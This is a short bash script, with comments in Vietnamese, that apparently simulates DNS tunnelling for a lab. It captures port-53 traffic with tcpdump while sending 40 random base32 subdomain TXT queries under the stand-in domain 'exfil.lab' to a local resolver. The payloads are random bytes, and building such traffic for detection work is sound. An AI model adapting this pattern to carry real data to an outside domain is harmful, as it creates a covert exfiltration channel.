#!/bin/bash
# Kịch bản 4: Giả lập DNS tunnel bằng dig

DNS_SERVER="127.0.0.11"
FAKE_DOMAIN="exfil.lab"
IFACE="any"
SO_LAN=40

mkdir -p ../pcap
TIME=$(date +%Y%m%d_%H%M%S)
PCAP="../pcap/04_dns_tunnel_$TIME.pcap"

echo "Bắt đầu bắt gói tin, lưu vào $PCAP"
tcpdump -i $IFACE port 53 -w $PCAP &
PID=$!
sleep 2

echo "Gửi $SO_LAN truy vấn DNS subdomain ngẫu nhiên"
for i in $(seq 1 $SO_LAN); do
    CHUOI=$(head -c 16 /dev/urandom | base32 | tr -d '=' | tr 'A-Z' 'a-z')
    dig @$DNS_SERVER $CHUOI.phan$i.$FAKE_DOMAIN TXT +short > /dev/null
    sleep 0.2
done

sleep 2
kill $PID

echo "Xong rồi."